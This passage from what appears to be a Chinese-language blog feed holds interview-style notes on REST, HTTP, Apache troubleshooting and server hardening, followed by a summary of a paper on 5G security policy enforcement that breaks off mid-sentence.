Resource?<ul><li>每個在REST架構底下的內容都算是一種資源，這種資源有點像是OOP內的Object</li><li>資源可以是test檔、HTML頁面、圖片或是其他動態資源</li><li>REST Server提供對於這些資源的存取，並使Client可以使用這些資源</li><li>每項資源都透過URI來做標誌</li></ul></li><li>甚麼是URI?<ul><li>Uniform Resource Identidier用於在REST架構中標誌資源</li><li><code>&lt;protocol&gt;://&lt;service-name&gt;/&lt;ResourceType&gt;/&lt;ResourceID&gt;</code></li><li>兩種種類的URI: <code>URN</code>、<code>URL</code></li><li><strong>URN</strong>: Uniform Resource Name<ul><li>透過一個獨特且持久的名稱來標示資源</li></ul></li><li><strong>URL</strong>: Uniform Resource Locator<ul><li>具有有關資源位置的相關資訊</li></ul></li></ul></li><li>你對JAX-RS的理解是甚麼?<ul><li>JAX-RS&#x3D; Java API for RESRful Web Service</li></ul></li><li>可以講一些你知道常見的HTTP Status Code嗎?<ul><li>1xx - 代表資訊回覆 (這啥?</li><li>2xx - 代表成功回應</li><li>3xx - 代表重新導向</li><li>4xx - 代表client出錯</li><li>5xx - 代表server出錯</li><li>200 ok</li><li>201- CREATED 用在PUT或POST</li><li>304-NOT MODIFIED - 用於有條件的GET請求，以減少網路頻寬使用，這個response的body要是空的</li><li>400-BAD REQUEST -驗證錯誤或缺少資料</li><li>401-UNAUTHORIZED - 請求中沒有包含有效身分認證資訊</li><li>403-FORBIDDEN - 無權或禁止存取資源</li><li>404-NOT FOUND - 資源方法不可用</li><li>500-INTERNAL SERVER ERROR- 當Server在運行時跳出一些異常</li><li>502-BAD GATEWAY - Server無法從其他Server中獲得response</li></ul></li><li>可以講一些你知道常見的HTTP Methods嗎?<br>  <img src="https://i.imgur.com/PBaFMYj.png"><ul><li>GET: 從Server中擷取資訊，一種唯讀的操作</li><li>POST: 用來在server中建立資源</li><li>PUT: 用來在server中更新現有資源或取代資源</li><li>DELETE: 用來在server中刪除資源</li><li>OPTIONS: 可獲取server上現有資源的支援選項清單</li><li>HEAD: 與Get相同，但只傳送狀態行以及Header部分</li></ul></li><li>SOAP以及REST之間的差異是甚麼?</li></ul><table><thead><tr><th>SOAP</th><th>REST</th></tr></thead><tbody><tr><td>Simple Object Access Protocol</td><td>Representatioanl State Transfer</td></tr><tr><td>用來實踐web服務的協定</td><td>是一種web的架構設計風格</td></tr><tr><td>SOAP無法使用REST</td><td>REST可使用SOAP作為實踐的一部分</td></tr><tr><td>有嚴格標準</td><td>不須嚴格遵守</td></tr><tr><td>client server更加耦合</td><td>REST Client靈活，不依賴Server開發方式</td></tr><tr><td>僅支援XML</td><td>支援XML,JSON,MIME,Text等</td></tr><tr><td>SOAP使用服務介面來公開資源</td><td>使用URI來開放資源</td></tr><tr><td>作為一種協定，它定義了自己的安全措施</td><td>僅根據它用於實現的協議繼承安全措施</td></tr></tbody></table><ul><li>開發RESTful web 服務的Best Practice會是甚麼?<ul><li>開發REST API並盡可能使用JSON資料格式並進行資料的接收與回覆，因為大多數client與server之間都內置了輕鬆讀取與解析JSON物件的方式<ul><li>應用程式以JSON格式作為Response應要將Content-Type設為application&#x2F;json</li><li>某些HTTP Client端會去察看Response Header的值來去做解析</li><li>resquest header中的Content-Type:要設成application&#x2F;json</li></ul></li><li><strong>在命名資源endpoint的時候應該使用複數名詞，而不是動詞，API Endpoint應要簡短、易於理解</strong><ul><li>不用動詞是因為HTTP Method中已經描述了請求行為為何了</li><li>常用的HTTP Verb&#x2F;Methods: GET、POST、PUT、DELETE</li></ul></li><li>使用nesting來表示資源的層次結構<ul><li>ex. GET for URI: &#x2F;authors&#x2F;:id&#x2F;address</li><li>別太多層</li></ul></li><li>錯誤處理應透過返回應用程式適當的error code來處理，REST中也定義了適當的HTTP Status Code可根據不同場景來一起發送<ul><li>error code要搭配適當錯誤訊息，幫助開發人員糾正措施，但別太詳細防止駭客知道太多</li><li>400-Bad Request</li><li>401-Unauthorized</li><li>403-Forbidden</li><li>404-Not Found</li><li>500-Internal Server Error</li><li>502-Bad Gateway</li><li>503-Service Unavailable</li></ul></li></ul></li><li>你了解哪些分散式系統架構?<ul><li>我知道用來maintain以及運行分散是系統的技術，就Kubernetes</li></ul></li><li><a href="https://searchapparchitecture.techtarget.com/definition/software-stack">那甚麼是Software Stack?</a><br>  <img src="https://i.imgur.com/NOpfrAK.png"><ul><li>是一堆獨立組件的集合，他們協同工作來完成應用程式的執行</li><li>這些組件可能包含:OS、協定、runtime環境、Library、DB和Function Call</li><li>根據所需運行的應用程式，至少會是OS、DB、支援編寫程式的工具和應用程式</li></ul></li><li>那甚麼是Solution Stack?<ul><li>要開發一款網路應用程式，會需要定義目標OS、網頁server、DB以及語言</li><li>或要定義OS、Middleware、DB及應用程式，有時也會將硬體涵蓋在內</li><li>舉例:<ul><li>BCHS<ul><li>OpenBSD</li><li>C</li><li>httpd</li><li>SQLite</li></ul></li><li>ELK<ul><li>Elasticsearch</li><li>Logstash</li><li>Kibana</li></ul></li><li>Ganeti<ul><li>Xen或KVM</li><li>搭配LVM的Linux</li><li>DRBD</li><li>Ganeti</li><li>Ganeti Web Manager</li></ul></li><li>LAMP<ul><li>Linux</li><li>Apache</li><li>MySQL&#x2F;MariaDB</li><li>Perl、PHP、Python</li></ul></li><li>LAPP<ul><li>Linux</li><li>Apache</li><li>PostgreSQL</li><li>Perl、PHP、Python</li></ul></li><li>LLMP<ul><li>Linux</li><li>Lighttpd</li><li>MySQL&#x2F;MariaDB</li><li>Perl、PHP、Python</li></ul></li><li>MEAN<ul><li>MongoDB</li><li>Express.js</li><li>Angular.js</li><li>Node.js</li></ul></li><li>MERN<ul><li>MongoDB</li><li>Express.js</li><li>React.js</li><li>Node.js</li></ul></li><li>MEVN<ul><li>MongoDB</li><li>Express.js</li><li>Vue.js</li><li>Node.js</li></ul></li></ul></li></ul></li></ul><h2 id="Apache-Troubleshooting"><a href="#Apache-Troubleshooting" class="headerlink" title="Apache Troubleshooting"></a><a href="https://www.acunetix.com/websitesecurity/troubleshooting-tips-for-apache/">Apache Troubleshooting</a></h2><h3 id="httpd-conf-設定錯誤"><a href="#httpd-conf-設定錯誤" class="headerlink" title="httpd.conf 設定錯誤"></a>httpd.conf 設定錯誤</h3><ul><li>Syntax Error<ul><li>Linux上需使用 <code>apachectl -configtest</code>來檢測Syntax Error</li><li>Windows系統上的Apache須先到Apache的bin目錄上，然後執行 <code>httpd.exe -t</code></li><li>修正問題後重啟Apache並重新透過上述指令做檢查</li></ul></li></ul><h3 id="Vulenrabilities"><a href="#Vulenrabilities" class="headerlink" title="Vulenrabilities"></a>Vulenrabilities</h3><ul><li>使用最新版本的Apache</li><li>使用弱掃工具去檢查</li><li>隨時查看最新的CVE，並上Patch</li></ul><h3 id="Apache-HTTP-Server-Logs"><a href="#Apache-HTTP-Server-Logs" class="headerlink" title="Apache HTTP Server Logs"></a>Apache HTTP Server Logs</h3><p>應分析Apache HTTP Server中的<strong>error logs</strong>，<strong>它提供了有關 Web 服務器上發生的任何錯誤的詳細資訊</strong> 路徑: <code> /var/log/apache2/error.log</code>、<code>/etc/apache2/apache2.conf</code>、<code>/etc/httpd/conf/httpd.conf</code></p><p>預設會放在Apache安裝目錄中的log目錄中的<strong>error_log</strong>檔案中<br>也可從httpd.conf中去設定要紀錄哪一類型的錯誤，httpd.conf中有8個log級別的資訊<br>除了error log以外還提供access log來紀錄Server處理過的所有請求。<br>這些日誌還可以對可能導致問題的原因提供額外的解釋，還可以補充錯誤日誌中的資訊。</p><h3 id="使用Mod-log-forensic-模組"><a href="#使用Mod-log-forensic-模組" class="headerlink" title="使用Mod_log_forensic 模組"></a>使用Mod_log_forensic 模組</h3><p><code>mod_log_forensic</code>模組用於提供client端請求的<strong>forensic log</strong><br>這包含了處理前與處理後的請求，並使用相同ID來引用相同的請求，因此可以輕鬆識別由特定請求引發的任何問題<br><strong>可以用來分析哪些請求會導致Web Server崩潰</strong><br>若要啟用這個模組，需要在 <code>Apache httpd.conf</code>文件中設定:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LoadModule log_forensic_module_forensic.so</span><br><span class="line">LoadModule uniques_id_module modules/mod_unique_id.so</span><br><span class="line">ForensicLog logs/forensic_log</span><br></pre></td></tr></table></figure><p>也可將 <strong>check_forensic</strong>的bash腳本與 mod_log_forensic模組結合使用，以列出在forensic log中發現任何不完整的請求<br><code>check_forensic &lt;log_file&gt;</code></p><h3 id="使用-mod-whatkilledus-module"><a href="#使用-mod-whatkilledus-module" class="headerlink" title="使用 mod_whatkilledus module"></a>使用 mod_whatkilledus module</h3><p>當事情非常糟糕且Apache Server崩潰時，<code>mod_whatkilledus</code>模組可用於紀錄有關崩潰的詳細技術資訊以及導致發生crash的原始client端請求。</p><p>此外若啟用了 <code>mod_backtrace</code>模組，這將包含顯示故障點的回溯，這對於在滿足某些條件後使用回溯註釋錯誤日誌很有用</p><p>對於Unix系統，只有在 httpd建構中啟用了 <code>--enable-exception-hook</code> 參數時，這些模組才會起作用。而對於Windows系統則沒有特殊要求</p><ul><li><code>mode_whatkilledus</code> 以及 <code>mod_backtrace</code> 的說明文件: <a href="https://emptyhammock.com/projects/httpd/diag/quick-start.html">https://emptyhammock.com/projects/httpd/diag/quick-start.html</a></li></ul><h3 id="使用第三方模組"><a href="#使用第三方模組" class="headerlink" title="使用第三方模組"></a>使用第三方模組</h3><p>使用第三方模組可能會導致在安裝Apache HTTP Server時遇到問題<br>因此應該禁用第三方模組，並檢查問題是否可以重現，若禁用模組可以解決問題則一個一個重起每個模組，以便確定是哪個模組帶來的原因</p><h3 id="將Apache-HTTP-Server做為單一process並使用Debug工具"><a href="#將Apache-HTTP-Server做為單一process並使用Debug工具" class="headerlink" title="將Apache HTTP Server做為單一process並使用Debug工具"></a>將Apache HTTP Server做為單一process並使用Debug工具</h3><p>典型的Apache HTTP Server安裝會運行多個process<br>但如果要troubleshooting最好是以單一process運行<br>可在啟動apache時候使用X選項<br><code>$ httpd -X</code> 這可使Apache以單一process模式來啟動，這代表Apache不會去fork出新的chidren或與終端detach<br>這樣所有流量與通訊都將通過一個單一的process，就能在debugger(ex. gdb)底下運行apache httpd並取得崩潰的bracktace並強制server去行coredump</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gdb httpd</span><br></pre></td></tr></table></figure><p>接著就是透過gdb先去設breakpoint，然後去做單步追蹤，一行一行看可能錯在哪?</p><h3 id="腳本執行問題"><a href="#腳本執行問題" class="headerlink" title="腳本執行問題"></a>腳本執行問題</h3><p>動態內容通常由 Apache HTTP Server通過 <code>mod_cgi</code>模組執行的腳本提供<br>這個模組包含自己的logging機制用來記錄在腳本執行期間發生的任何錯誤</p><p>啟用<strong>ScriptLog</strong>指令後，mod_cgi將記錄任何未按照預期執行的腳本的輸出，包含<br>Server Response Code，收到的請求以及任何向客戶端發出的任何回應</p><p>要啟用此功能需要修改 httpd.conf文件，並指定ScriptLog指令和保存log的位置<br><code>ScriptLog logs/cgi_log</code></p><h2 id="IIS-Troubleshooting"><a href="#IIS-Troubleshooting" class="headerlink" title="IIS Troubleshooting"></a><a href="https://docs.microsoft.com/en-us/previous-versions/iis/6.0-sdk/ms524996(v=vs.90)">IIS Troubleshooting</a></h2><h2 id="Server端安全"><a href="#Server端安全" class="headerlink" title="Server端安全"></a>Server端安全</h2><ul><li>Server端有甚麼安全建議?<ul><li>移除不必要服務<ul><li>默認安裝有時候會安裝許多不必要的功能ex. 遠端註冊、printer server…etc</li><li>服務越多，開放的port就越多，因此會暴露更多風險</li><li>關閉server中的非必要服務</li></ul></li><li>確保遠端存取的保護措施<ul><li>若web admin需要遠端登入Web server，則需要使用隧道和加密協定來確保遠程連線獲得適當防護 </li><li>在設備或軟體上使用安全token </li><li>遠端存取應限制特定數量IP以及帳戶</li></ul></li><li>分離開發&#x2F;測試&#x2F;生產環境<ul><li>由於開發人員在生產服務器上開發更新版本的 Web 應用程序更容易、更快捷，因此 Web 應用程序的開發和測試直接在生產服務器本身上完成是很常見的。</li><li>有可能會在網路上蒐到特定網站的更新版本，或在&#x2F;test&#x2F;、&#x2F;new&#x2F;或其他類似子目錄底下發現不應該給公眾知道的內容 </li><li>所以如果在同台Server上同時開發、測試跟生產，如果權限沒設好而且早期開發階段安全性容易沒做好，容易被打穿網站</li></ul></li><li>Web應用內容以及Server Script安全<ul><li>web應用或網站文件應該要位於OS系統文件、log文件以外的獨立分區或driver上</li><li>因為如果攻擊者獲得web目錄存取權限，可能就可以透過其他漏洞去做提權並存取整個磁碟上的資料</li></ul></li><li>確保適當權限與特權<ul><li>始終分配運行特定網路服務所需的最權限</li></ul></li><li>按時安裝所有patch</li><li>監控或audit server <ul><li>應經常監控和檢查所有網路服務log、網站access log、DB Server log(ex. Microsoft SQL Server、MySQL、Oracle)和OS Log</li><li>若log中發現奇怪活動，應該立刻去解決它</li></ul></li><li>用戶帳戶管理<ul><li>禁用未使用的默認帳戶<ul><li><code>userdel</code> 指令</li></ul></li><li>每個帳戶要設定它應有的正確權限</li></ul></li><li>刪除未使用的模組和應用程式<ul><li>Apache預設會安裝多預定義的模組 </li><li>典型Web Server不會使用這些模組，因此需要關閉，防止針對此類模組的攻擊</li></ul></li><li>使用Network Sever軟體所提供的安全工具<ul><li>Mircosoft 發布許多工具來幫助admin來保護IIS Web Server安裝</li><li>Apache也有提供 <strong>mod_security</strong>模組</li></ul></li><li>使用外部scanner<ul><li>nessus</li><li>nikto</li><li>或其他弱掃工具</li></ul></li></ul></li></ul><h2 id="Log檔案"><a href="#Log檔案" class="headerlink" title="Log檔案"></a>Log檔案</h2><p>系統錯誤資訊 - <code>/var/logs/syslog</code> 或 <code>/var/logs/messages</code><br>與登入帳密有關的log - <code>/var/logs/secure</code> 或 <code>/var/logs/auth.loh</code>(Debian)<br>紀錄哪個服務的log會被放在哪? - <code>/etc/rsyslog.conf</code>，會被放在<code>/etc/rsyslog.d</code> 底下</p><h3 id="Syslog等級"><a href="#Syslog等級" class="headerlink" title="Syslog等級"></a>Syslog等級</h3><p><img src="https://i.imgur.com/GxaNR3I.png"></p><h3 id="Systemcall"><a href="#Systemcall" class="headerlink" title="Systemcall"></a>Systemcall</h3><h2 id="C-x2F-C"><a href="#C-x2F-C" class="headerlink" title="C&#x2F;C++"></a>C&#x2F;C++</h2><ul><li>如果程式中使用malloc但沒有free掉會怎樣?<ul><li>heap memory會一直被占著，直到程式結束，不會自動釋放</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 學習筆記 </category>
          
          <category> Troubleshooting </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Network </tag>
            
            <tag> Linux </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Security policies definition and enforcement utilizing policy control function framework in 5G</title>
      <link href="/posts/de3933f9.html"/>
      <url>/posts/de3933f9.html</url>
      
        <content type="html"><![CDATA[<style>    :root{    --maincolor: #50fa7b;    }   .info{    padding: 15px;    margin-bottom: 20px;    color: #ffffff;    border: 1px solid transparent;    border-radius: 10px;    background-color: #343232;    border-color: #b8bdb4;   }   .special{        border-bottom: 3px solid var(--maincolor);        color: inherit;        text-decoration:none;   }   .newbold{        color: #ffffff;        font-weight: bold;        text-decoration:none;   }   a{    color: #337ab7;    text-decoration: none;   }</style><h2 id="1-Introduction"><a href="#1-Introduction" class="headerlink" title="1. Introduction"></a>1. Introduction</h2><p>本篇討論的是3GPP定義的5G System(5GS)範圍之中的網路安全議題</p><h3 id="5G標準制定"><a href="#5G標準制定" class="headerlink" title="5G標準制定"></a>5G標準制定</h3><p>許多組織或會議對於開發5G架構有卓越貢獻，尤其是在安全層面:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">- ITU</span><br><span class="line">- ETSI</span><br><span class="line">- IETF</span><br><span class="line">- NGMN</span><br><span class="line">- 5G-PPP</span><br><span class="line">- NIST</span><br><span class="line">- GSMA等等</span><br></pre></td></tr></table></figure><p>有些負責在特定infra上像是關鍵基礎設施，其餘則是為特定用例開發安全標準</p><blockquote><p>S3A Working Group → 定義5G網路 end to end 安全層面</p></blockquote><h3 id="5GS"><a href="#5GS" class="headerlink" title="5GS"></a>5GS</h3><p>5G System &#x3D; Access Network + Core Network + UE<br>System Arcitecture → Service-Based Architecture → Is composed of multiple NFs<br>SBA架構中，不同的NFs之間的互動可以兩個NF的點對點的參考點來表示<br><strong>SBI(Service-based Interface)</strong> 用來表示一個給定的NF要如何提供或開放一組服務</p><p><strong>Policy Control Function(PCF)</strong> 是一個網路功能用以提供統一且一致的框架來定義任何類型的策略，在前幾代行動網路中，PCF僅用於QoS或計費方面的策略制定</p><p>5G架構中增加了對於網路資料分析的服務，藉由一個新的NF，NWDAF(Network Data Analytics Services)<br>用於</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 負載級別(Load Level)資訊</span><br><span class="line">2. 服務體驗</span><br><span class="line">3. 網路效能</span><br><span class="line">4. 異常行為</span><br></pre></td></tr></table></figure><p><span class="special">PCF可以訂閱與此類資訊相關的網路分析通知，並用於計算或更新策略，但這目前尚未標準化</span><br>新的統一策略控制框架與5G系統以及增強的資料分析實體之間並無建立明顯的連結，而本篇論文的結果可以幫助這三項區域變得更加緊密</p><p>主要目標是要找到一個有效的security enforcement schema用以彈性地建立新的安全策略，並動態地回應持續變化地安全環境，橫跨5G end to end 架構。</p><p>對於橫跨5G系統地Security Enforcement應在<strong>TSG-SA</strong> 層級被討論</p><p>5GS架構中對於User Plane Security Enforcement，會是基於UE與基站之間的air interface其中地機密性與完整性演算法是否啟用</p><p>對於UP的完整性保護演算法是可以選擇性啟用的(例如各切片可以是否啟用)</p><h3 id="網路切片"><a href="#網路切片" class="headerlink" title="網路切片"></a>網路切片</h3><p><span class="special">個別網路切片提供不同種服務可能會有著不同的安全需求，並採用不同安全協定與方法；因此對於不同的網路切片提供不同層級的安全防護會是關鍵</span></p><p>對於安全加密演算法的使用也是選擇性的(e.g. 128bits vs 256 bits key length)<br>像是對於關鍵基礎設施的安全需求以及enhanced Mobile Broadband 大量使用場景的安全需求也有所不同</p><p>將 QoS 原則應用於安全，目標應是利用統一的策略控制框架，並利用新的資料分析功能作為對於網路以及UE知識基礎，在 5G end to end 架構中實現有效的安全策略定義和執行</p><p>現行對於電信網路的保護策略不外乎防火牆、IDS、DDOS保護系統等等，並被廠商的特定管理工具所管理<br>而這些安全功能是為了保護整個網路或根據他們在網路中的定位，而未考慮個別UE</p><ol><li>偵測到單一UE發生安全問題的能力</li><li>應用解決措施到單一UE的方式到目前都是個問題</li></ol><p>本篇研究補足了這些機制，並從end to end網絡的角度豐富了安全性，並提共適當的粒度(granularity) 來考慮個別UE的安全策略<br>→對於 uRLLC 以及 mMTC 部屬場景有幫助</p><p><img src="https://i.imgur.com/BOTV0hU.png"></p><h2 id="2-Challenges-to-apply-end-to-end-security-enforcement-in-5G"><a href="#2-Challenges-to-apply-end-to-end-security-enforcement-in-5G" class="headerlink" title="2. Challenges to apply end to end security enforcement in 5G"></a>2. Challenges to apply end to end security enforcement in 5G</h2><p>為了實踐end to end security enforcement，有四大挑戰要解決</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- 為Security Enforcement應用QoS原則</span><br><span class="line">- 會話管理和用戶平面</span><br><span class="line">- 策略控制</span><br><span class="line">- 網路分析</span><br></pre></td></tr></table></figure><h3 id="2-1-Challenges-to-apply-QoS-principles-to-security-enforcement"><a href="#2-1-Challenges-to-apply-QoS-principles-to-security-enforcement" class="headerlink" title="2.1 Challenges to apply QoS principles to security enforcement"></a>2.1 Challenges to apply QoS principles to security enforcement</h3><p>當根據業務需求（例如在垂直市場中產生）將 QoS 實施基本原則應用於安全實施時，主要困難之一是能夠以與 QoS 在網絡中量化的類似方式來衡量安全特性</p><p>QoS 配置文件被很好地定義為應用於 QoS 流的一組 QoS 參數（QoS 流是分組數據單元 (PDU) 會話中 QoS 區分的最細粒度）。這種參數化是定量的，即可以用數字來衡量。例如，5G QoS 標識符是一個由標量表示的參數，用作 5G QoS 特性（如調度、權重、准入閾值等）的參考。甚至還有預先配置的標準化值。但是，如何在 5G 架構中構建安全配置文件，如何建立完整性保護、機密性保護、訪問控製或惡意軟件檢測等方面的量化安全參數化？我們解決這個問題的提議在第 3.1 節中提出。</p><h3 id="2-2-Challenges-at-session-management-level-to-enforce-security-controls"><a href="#2-2-Challenges-at-session-management-level-to-enforce-security-controls" class="headerlink" title="2.2  Challenges at session management level to enforce security controls"></a>2.2  Challenges at session management level to enforce security controls</h3><p>SMF負責接收由UE所發送來的建立PDU Session的請求<br>然而現今的PDU 請求並沒有包含任何安全參數</p><p>所以UE請求<strong>特定的</strong> 5G UP安全服務，即”安全的PDU”，是不可能的<br>然後像是政府關鍵基礎設施可能就有需求是，應提供特殊安全措施在UE與Data Networl之間的PDU Session<br>例如某些<strong>資料無線電承載(Data Radio Bearer)</strong> 支援某些服務中的強加密演算法或更長的加密金鑰</p><p>SMF在建立PDU會話時，根據來自</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- UDM的Subscriber資訊</span><br><span class="line">- 每個DNN/SMF中切片的本地配置UP安全策略</span><br><span class="line">- 每個UE所支援的最高Data Rate</span><br></pre></td></tr></table></figure><p>用以在PDU Session建立UP Security Enforcement 來在每個DRB中提供完整性保護<br>SMF的本地配置被認為是全局適用(global applicable)的靜態策略</p><p>問題是這種靜態方法對於之後的的用例是否仍然有效，其中訂閱計劃可能與安全增值服務和相應的租戶（例如關鍵基礎設施的所有者）需要不同級別的安全（例如每個切片）和對安全事件作出反應的能力</p><p>這些use case需要彈性、可擴展和動態的策略管理以及設定<br>此外，security enforcement只是指示是否要在NG-RAN網路區域應用UP完整性與機密性保護，並僅適用於3GPP類型的存取</p><p>UP Security Enforcement 從NG-RAN擴展到傳輸以及核網會是個挑戰<br>(即PDU會話提供的整體連接的end to end security enforcement方法 會是個挑戰)</p><p><img src="https://i.imgur.com/7xtxVnm.png"><br>圖2顯示了當前UP security enforcement以及注意事項</p><p><img src="https://i.imgur.com/JwXF00a.png"></p><p>一旦PDU Session建立，<br>當前Session的特徵(即PDU會話資訊)僅限於一些主要與QoS相關的資訊元素(例如:QoS Flow ID,Reflective QoS Indicator)<br>當發生了PDU層級的安全事件，並沒有觸發緩解措施的安全屬性<br>例如，當應用程式處理被歸類為機密的資料時在UE與Data Network之間的PDU Session內會需要特別的安全措施，像是DRB所支援服務中所使用的強加密演算法或更長的加密金鑰</p><blockquote><p>在 3.25章節開發了一個框架，為PDU層級的安全事件提供安全屬性</p></blockquote><h3 id="2-3-Challenges-to-fine-security-policies-under-policy-control-framework"><a href="#2-3-Challenges-to-fine-security-policies-under-policy-control-framework" class="headerlink" title="2.3 Challenges to fine security policies under policy control framework"></a>2.3 Challenges to fine security policies under policy control framework</h3><p>雖然為每個訂閱定義安全策略很費力，但這與為QoS進行此操作似乎沒甚麼不同<br>可以預期，安全策略與QoS測並非真正獨立，而是相同策略可被應用在大量訂閱 e.g.per slice</p><p><strong>Policy and Charging Control rule (PCC rule)</strong> 包含啟用用戶面偵測、策略控制、對於服務資料流的適當計費所需的資訊</p><p>兩種PCC rules存在:動態與預定義規則<br>動態規則由PCF提供給SMF，而預定義PCC規則則是被設定至SMF</p><p>當動態規則與預先定義的PCC規則有相同優先級，則動態規則優先<br>這些policies的目標是:</p><ul><li>PDU sessions</li><li>Service Data Flows (SDF). Set of PDUs (within PDU session) identidied by traffic filters</li></ul><p>PCF Control是否應用於PDU Session是由SMF策略基於DNN或每個切片去定義的<br>若沒有PCF Cnotrol，則本地基於策略的rule會在SMF被設定</p><p>PCC rule 定義包含:</p><ul><li>Sevice data flow detection mechanism  (ex. filters, application template)</li><li>Charging releated Information Elements(IEs) </li><li>Policy control related IEs  (ex. Gating, QoS, bit rates…etc)</li></ul><p>service data flow filter 包含用於匹配IP PDU流量以及Ethernet PDU流量的用戶平面資料<br>SMF應用啟用的PCC規則內的Service data flow template information來指示UPF去識別屬於特定<br>service flow的封包</p><p><span class="special">作為一個PCC規則一部分的安全資訊元素的適當定義會是一個關鍵挑戰</span></p><p>目前 <strong>3GPP TS 23.503: Technical Specification Policy and Charging Control Frameworkfor the 5G System</strong> 所定義的PCC Rules不明確包含此類參數，也不作為能夠識別安全事件的服務資料流偵測的一部分，或者做為策略控制操作的一部分。 此外，SMF發送有關PDU Session狀態(e.g. 存取類型、漫遊、IP位址等等)的PCF資訊，因此PCF可以基於特定觸發器做出動態反應從而相應變更策略，所以安全觸發器的定義非常重要，因為它不僅會影響網絡的安全狀態，還會影響網絡的整體 QoS 和 SLA（例如 DDoS 攻擊），然而去創造這些安全觸發器(例如，最近發現的安全漏洞、詐欺、攻擊、違規存取等等)會是挑戰，在UPF或其他特定安全探測器(security probe)中設定一部分偵測過濾器(detection filter)，其策略目標是將安全保證(security assurance)層面包含進網路整體的服務保證中。</p><p><span class="special">⚠️目前問題則是，如何使安全性成為 PCF 的 PCC 決策過程的一部分？</span><br>本篇論文在3.3章節提供解答</p><h3 id="2-4-Challenges-to-introduce-security-use-cases-under-network-analytics"><a href="#2-4-Challenges-to-introduce-security-use-cases-under-network-analytics" class="headerlink" title="2.4 Challenges to introduce security use cases under network analytics"></a>2.4 Challenges to introduce security use cases under network analytics</h3><p><strong>Network Data Analytics function (NWADF)</strong> 作為SBA架構出現在Release 15</p><p>可以有多個專門用於不同類型分析的 NWDAF，由分析 ID 訊息元素 (IE) 標識。此 IE 用於識別 NWDAF 可以生成的受支持分析的類型。 NWDAF 出於不同目的與不同實體進行交互，例如基於訂閱不同網絡功能提供的事件的數據收集、從數據存儲庫和 NF 檢索訊息，以及向不同類型的消費者按需提供分析，目前NWADF的資料蒐集功能僅允許從控制平面來源為切片或UE獲取資料，但目前如何從UPF蒐集有關用戶平面安全資料尚未標準化，這實際上目前僅限於流量和數據速率。</p><p><strong>OAM(Operation,Administration and Management)</strong> 系統僅測量與追蹤資料，這些資料可通過Management Service 共享給NWADF</p><p>出於安全分析目的，從用戶平面流量分析中收集的有關惡意軟體、殭屍網絡、協定異常等的資訊，例如通過 [18] 提出的安全探測器（例如嵌入 UPF 中的 IDS）或惡意軟件沙箱，將非常有用通過新的安全用例增強網絡分析。</p><p>這些分析資訊環繞網路切片的負載水平、服務體驗、網路效能、移動性、QoS、UE行為等等<br>提供了有價值的知識基礎</p><p>本文範圍中有三個基本問題被提出:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- 如何從所分析知識的基礎上取得安全性相關的資訊?</span><br><span class="line">- 在NWADF中可監控和進一步分析哪些特定的新安全參數?</span><br><span class="line">- 在end to end 5G架構中PCF，要如何利用這些資訊來設定並執行安全策略?</span><br></pre></td></tr></table></figure><h2 id="3-Proposed-approach-to-security-enforcement-in-5G"><a href="#3-Proposed-approach-to-security-enforcement-in-5G" class="headerlink" title="3. Proposed approach to security enforcement in 5G"></a>3. Proposed approach to security enforcement in 5G</h2><p>從實施角度來看，到目前為止，行動網絡中安全策略和 QoS 參數的實現在網絡中存在很大差異</p><p>5G PCF是一個單一框架用來定義任何類型的策略並將其遞交給其他控制平面上的NF</p><p>從不久的將來角度來看，當租戶要求的訂閱計畫(Subscription Plan)將需要包含安全條款時，即安全性作為SLA的重要組成部分，就像當今的QoS一樣，我們提出了新的security enforcement方式利用了統一策略控制模型</p><h3 id="3-1-Application-of-QoS-policies-to-security-use-cases"><a href="#3-1-Application-of-QoS-policies-to-security-use-cases" class="headerlink" title="3.1 Application of QoS policies to security use cases"></a>3.1 Application of QoS policies to security use cases</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- session-AMBR</span><br><span class="line">- UE-AMBR</span><br></pre></td></tr></table></figure><p>我們的提案是，這些 QoS 策略可以在接收安全事件或事件時從 PCF 受限制地和動態地應用到網絡中，這些安全事件可以在 NWDAF 或用戶平面的其他安全分析平台（例如，放置在管理平面中的 SIEM 工具，嵌入在 UPF 中的 IDS 系統等）中建立</p><p>基於預定義的安全指標，可以從 PCF 執行不同的策略，實際上作為網絡中的有效緩解機制：</p><ul><li>設定新的session AMBR</li><li>設定新的UE AMBR，這將會是一種對於UE的隔離 (例如，UE是作為DDoS攻擊的active bot)</li><li>在QoS Profile內使用更嚴格的安全控制以設定新的PDU Session</li></ul><p>QoS profiles 可在5G AN中由SMF動態建立；可以透過來自SMF的N1介面上的會話管理信令或直接在N4介面上的UPF上對UE實施特定的QoS規則</p><p>N1介面: UE $\leftrightarrow$ AMF<br>N4介面: SMF $\leftrightarrow$ UPF 用以在用戶平面中管理資料會話<br>N4基於PFCP協定(Packet Forwarding Control Protocol)</p><p>SMF 確實通過規則管理 QoS 流，將流量過濾器與來自 PCF 的 QoS 策略相關聯。<br>流量過濾器集在 UPF 